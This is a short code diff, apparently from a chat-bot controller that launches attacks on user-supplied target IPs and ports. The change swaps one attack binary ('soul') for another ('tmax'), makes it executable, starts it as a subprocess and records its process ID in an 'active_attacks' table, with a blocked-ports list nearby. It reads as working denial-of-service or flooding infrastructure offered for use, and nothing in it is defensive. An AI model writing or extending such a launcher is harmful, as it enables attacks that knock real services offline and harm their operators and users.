@@ -12,14 +12,15 @@ blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
 userdetails = {}
 active = {}
 
-if os.path.exists('./soul'):
-    os.chmod('./soul', 0o755)
+if os.path.exists('./tmax'):
+    os.chmod('./tmax', 0o755)
 
 
 def runcommand_sync(user_id, target_ip, target_port, action):
     try:
         if action == 1:
-            process = subprocess.Popen(["./soul", target_ip, str(target_port), "1", "200"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            process = subprocess.Popen(["./tmax", target_ip, str(target_port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+          #  process = subprocess.Popen(["./soul", target_ip, str(target_port), "1", "200"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             active_attacks[(user_id, target_ip, target_port)] = process.pid
         elif action == 2:
             pid = active_attacks.pop((user_id, target_ip, target_port), None)
